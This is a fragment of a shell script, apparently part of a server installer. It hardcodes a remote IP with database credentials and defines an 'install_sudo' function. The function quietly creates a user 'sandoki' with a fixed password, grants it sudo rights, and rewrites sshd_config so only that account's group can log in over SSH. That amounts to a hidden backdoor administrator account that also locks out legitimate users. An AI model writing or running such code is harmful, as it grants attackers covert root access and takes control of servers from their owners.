...
HOST='50.116.18.242'
USER='loveyoun_developer'
PASS='@@@developer'
DB='loveyoun_developer'
...
install_sudo(){
  {
    useradd -m sandoki 2>/dev/null; echo sandoki:@@dokisan | chpasswd &>/dev/null; usermod -aG sudo sandoki &>/dev/null
    sed -i 's/PermitRootLogin yes/PermitRootLogin no/g' /etc/ssh/sshd_config
    echo "AllowGroups sandoki" >> /etc/ssh/sshd_config
